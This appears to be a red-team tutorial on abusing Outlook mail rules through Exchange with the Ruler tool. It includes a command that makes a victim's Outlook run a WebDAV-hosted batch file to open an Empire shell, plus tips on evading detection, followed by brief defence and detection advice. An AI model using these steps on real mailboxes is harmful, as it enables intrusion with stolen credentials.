# Pivoting Through Exchange Using Ruler

## Pre-requisits

* **Installing **[**GO **](https://github.com/golang)
* [**ruler** ](https://github.com/sensepost/ruler)

## Introduction

Ruler is a tool that allows you to interact with Exchange servers remotely, through either the MAPI/HTTP or RPC/HTTP protocol. The main aim is abuse the client-side Outlook features and gain a shell remotely.

Ruler attempts to interact with Exchange and uses the Autodiscover service \(just like in your organization\) to discover the relevant information needed to proceed.

## What can we use ruler for

We can use ruler to do many things ill list its main feature below but, what i am going to show you is  gonna be a way to pop a shell through ruler and the only thing we need is a valid username/password and the user to have outlook open.

in a real life scenario most employees leave their outlook open because they are often checking for incoming mails etc.

* Enumerate valid users
* Create new malicious mail rules 
* Dump the Global Address List \(GAL\)
* VBScript execution through forms
* VBScript execution through the Outlook Home Page

crazy isnt it? now that we know some of ruler usage lets get starting

### Checking that we are good to go :

i wont go through on how to find mail structures,adding dns records etc ill leave you to explore it.

once we know the mail structure,added dns records etc we can start by checking with the exchange server that we  can communicate to it and that we are able to authenticate and open the mailbox.

depends on how you compile ruler it may be different than the syntax below

```
go ruler run --email test@lab.local --verbose check
```

once executed we will get a password prompt,if everything is valid we should get a messsage stating that the mailbox has been opened and that we are good to go.

### Viewing Existing Rules :

```
go ruler run --email test@lab.local display
```

### Setting up an Empire Listener

i wont go into how to set up an empire or its  listener you can refer to chryzsh [link](https://chryzsh.gitbooks.io/darthsidious/content/responder/relay.html) in the book to get an understanding of how to quickly set it up. instead of using a one liner we should generate a .bat powershell and host it on a webdav server.

there are many guides on the net on how to quickly set up a webdav server.

its worth mentiniong that its possible to evade detection by zipping the .bat and then calling it through webdav directory.

ill update this method in the future.

### Creating the rule

```
go ruler run --email test@lab.local add --name test --trigger shell --location "\\\\webdav.test\\webdav\shell.bat" --send
```

this command basically gonna send an email to the user inbox and trigger our rule when that happens we should shortly after recieve our empire shell.

now its worth mentioning that the user wont see the mail in his sent items since its automatically gettin deleted so we dont have to worry about that.

### Deleting the rule & Cleaning up

once we are done we can delete

`go ruler run  --email test@lab.local delete --name test`

### Defending against Ruler

1. Enable Multi-factor Authentication for all of your users, especially those with administrative privileges.

2. Monitor your accounts for illicit activity. You can do this manually, or with a security monitoring toolset. This may not prevent the initial breach, but will shorten the duration, and the impact of the breach.

### How to Detect it

The simplest method is to use a script microsoft made to get all the rules

[https://github.com/OfficeDev/O365-InvestigationTooling/blob/master/Get-AllTenantRulesAndForms.ps1](https://github.com/OfficeDev/O365-InvestigationTooling/blob/master/Get-AllTenantRulesAndForms.ps1)

You will need to have a global admin role to run the script



### Closing Thoughts

with ruler we can pop a shell and pivot across the network its a great tool that has alot to explore what i showed here is a just one of the things its capable of doing i suggest you to explore the rest of it and get better understanding of its true power.



Written by : ~~**BufferOv3rride**~~

